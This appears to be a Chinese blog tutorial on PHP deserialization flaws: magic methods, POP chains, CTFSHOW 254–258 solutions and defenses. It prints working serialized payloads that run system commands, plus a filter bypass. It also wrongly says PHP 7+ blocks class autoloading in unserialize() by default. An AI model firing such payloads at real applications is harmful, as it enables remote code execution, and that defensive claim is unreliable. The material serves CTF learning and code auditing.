@@ -1,0 +1,249 @@
+一次搞懂反序列化漏洞的核心原理与利用技巧，附CTFSHOW 254~258详细题解。
+
+---
+
+📌 一、什么是反序列化操作？
+
+反序列化是将字符串/数组等格式化数据还原为对象的过程，与之对应，序列化是将对象转换为可存储/传输的字符串。
+
+不同语言的序列化表示各有特色：
+
+语言 序列化函数 反序列化函数 典型格式
+PHP serialize() unserialize() O:4:"User":2:{...}
+Java ObjectOutputStream ObjectInputStream 二进制流（aced0005 开头）
+Python pickle.dumps() pickle.loads() 二进制协议
+.NET BinaryFormatter BinaryFormatter 二进制流
+
+核心：
+
+· serialize() → 对象 → 字符串
+· unserialize() → 字符串 → 对象
+
+---
+
+🪄 二、PHP魔术方法（触发条件一览）
+
+魔术方法在特定时机自动调用，反序列化漏洞往往从这里撕开口子。
+
+魔术方法 触发条件
+__construct() new 实例化对象时
+__destruct() 对象被销毁时（脚本结束或 unset）
+__sleep() serialize() 执行前
+__wakeup() unserialize() 执行后
+__toString() 对象被当作字符串使用时（如 echo $obj）
+__invoke() 对象被当作函数调用时（$obj()）
+__call() 调用不存在的实例方法
+__callStatic() 调用不存在的静态方法
+__get() 读取不可访问的属性
+__set() 赋值不可访问的属性
+__isset() 对不可访问属性调用 isset() 或 empty()
+__unset() 对不可访问属性调用 unset()
+__clone() 对象克隆完成时（clone $obj）
+__set_state() var_export() 导出类时（静态方法）
+__debugInfo() var_dump() 对象时，自定义输出的属性
+__autoload() 尝试加载未定义的类（已废弃，建议 spl_autoload_register）
+
+💡 重点：__destruct()、__wakeup()、__toString()、__call() 在反序列化漏洞中出现频率极高。
+
+---
+
+💥 三、漏洞成因：为什么反序列化会不安全？
+
+根本原因：
+程序对用户输入的序列化字符串未做任何过滤/校验，直接传给 unserialize()。攻击者可以精心构造序列化数据，在反序列化过程中自动触发某些魔术方法，进而执行恶意代码、读写文件、SQL注入等。
+
+```php
+<?php
+class B {
+    public $cmd = '';
+    public function __destruct() {
+        system($this->cmd);   // 析构时执行系统命令
+    }
+}
+// 注意：没有 new 对象，直接反序列化用户输入！
+unserialize($_GET['x']);
+```
+
+攻击者只需构造：
+
+```
+x=O:1:"B":1:{s:3:"cmd";s:6:"whoami";}
+```
+
+即可在对象销毁时执行 whoami。
+
+关键点：
+
+· 反序列化自动触发魔术方法，无需主动调用。
+· 属性值（如 $cmd）完全可控。
+· 漏洞利用的核心：找到一条从入口（unserialize）到危险函数（system、eval 等）的调用链。
+
+---
+
+⛓️ 四、POP链构造：面向属性编程
+
+当危险操作不在魔术方法中，而是在某个普通方法里，我们就需要通过属性串联，让程序自动调用到那条危险方法。
+
+POP（Property-Oriented Programming） 即面向属性编程——通过控制对象的属性，在反序列化后间接触发危险函数。
+
+一个典型的POP链由三部分组成：
+
+```
+[ 起点 ] → [ 跳板 ] → [ 终点 ]
+```
+
+· 起点：__wakeup()、__destruct()、__toString() 等自动执行的魔术方法。
+· 跳板：普通方法，但这些方法内部又调用了其他对象的方法，并且属性可控。
+· 终点：system、eval、file_put_contents 等敏感函数。
+
+🧩 构造思路：
+从起点出发，寻找哪个属性可以控制跳板方法的调用，层层递进，直到触达危险函数。
+
+---
+
+🧪 五、实战：CTFSHOW 反序列化训练（254~258）
+
+🔹 254 – 对象引用执行逻辑
+
+· 环境：POST 传入 username 和 password，服务器反序列化 Cookie 中的 user 对象。
+· 考点：无直接漏洞，需理解对象赋值引用。
+· 解法：正常提交即可进入下一题。
+
+---
+
+🔹 255 – 反序列化变量修改（基础）
+
+目标：让 isVip 变为 true 获取 flag。
+
+```php
+class ctfShowUser{
+    public $isVip = true;
+}
+```
+
+序列化并 URL 编码：
+
+```php
+$a = new ctfShowUser();
+echo urlencode(serialize($a));
+```
+
+Cookie 构造：
+
+```
+user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
+```
+
+要点：直接序列化对象，覆盖原本 isVip=false 的状态。
+
+---
+
+🔹 256 – 反序列化参数修改2
+
+```php
+class ctfShowUser{
+    public $username='xiaodi';
+    public $password='xiaodisec';
+    public $isVip=true;
+}
+```
+
+同样方法序列化并发送即可。
+
+---
+
+🔹 257 – 对象调用逻辑（POP链入门）
+
+```php
+class ctfShowUser{
+    public $class = 'backDoor';
+    public function __construct(){
+        $this->class = new backDoor();
+    }
+}
+class backDoor{
+    public $code = 'system("tac flag.php");';
+}
+```
+
+此处 __construct() 在 new 时调用，但反序列化不会触发 __construct()。
+我们直接在序列化字符串中将 $class 属性替换为 backDoor 对象实例，反序列化后 ctfShowUser 对象的 $class 就是一个 backDoor 对象。
+服务器后续可能调用 $class->code 或类似逻辑，导致代码执行。
+
+Payload：
+
+```
+O:11:"ctfShowUser":1:{s:5:"class";O:8:"backDoor":1:{s:4:"code";s:23:"system("tac flag.php");";}}
+```
+
+URL编码后放入 Cookie。
+
+---
+
+🔹 258 – 反序列化参数修改&对象调用逻辑&正则绕过
+
+源码增加正则过滤：
+
+```php
+$user = str_replace(':11', ':+11', $user);
+$user = str_replace(':8', ':+8', $user);
+```
+
+将对象长度标识 :11 替换为 :+11，导致原本 O:11:"ctfShowUser" 变长，反序列化时会因格式错误而失败。
+
+绕过：
+我们同样在序列化字符串中主动将 :11 改为 :+11、:8 改为 :+8，保证和过滤后的格式一致。
+
+```php
+$a = serialize(new ctfShowUser());
+$b = str_replace(':11', ':+11', $a);
+$c = str_replace(':8', ':+8', $b);
+echo urlencode($c);
+```
+
+输出：
+
+```
+O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%27tac+flag.php%27%29%3B%22%3B%7D%7D
+```
+
+绕过正则，成功执行 tac flag.php。
+
+---
+
+🌐 六、推荐靶场：PortSwigger 不安全反序列化
+
+官方高质量黑盒测试环境：
+👉 https://portswigger.net/web-security/all-labs#insecure-deserialization
+
+涵盖 PHP、Java、Python 反序列化漏洞，从修改对象属性、构造 POP 链到利用 Gadget 库（如 Apache Commons Collections）全都有。
+
+示例序列化数据（PHP）：
+
+```
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
+O:4:"User":3:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;s:11:"avatar_link";s:19:"users/wiener/avatar";}
+```
+
+---
+
+📚 七、总结与防御
+
+攻击者视角：
+
+1. 寻找 unserialize() 且参数可控的点。
+2. 审计代码中可利用的魔术方法/普通方法。
+3. 构造 POP 链，将可控属性与危险函数串联。
+4. 生成序列化 Payload，打过去。
+
+防御者视角：
+✅ 绝不反序列化不可信的用户输入。
+✅ 若必须使用，采用白名单类限制（allowed_classes）。
+✅ 升级到 PHP 7+，unserialize() 默认禁用 __wakeup() 之外的类自动加载。
+✅ 使用 HMAC 签名验证序列化数据完整性。
+
+---
+
+反序列化漏洞是“把数据变回对象”时引爆的定时炸弹，理解魔术方法的触发时机、POP链的串联逻辑，是进阶 PHP 代码审计的必修课。希望这篇笔记能帮你打通反序列化的任督二脉。🧱💻
+
+—— 知识循环，序列有序 ——
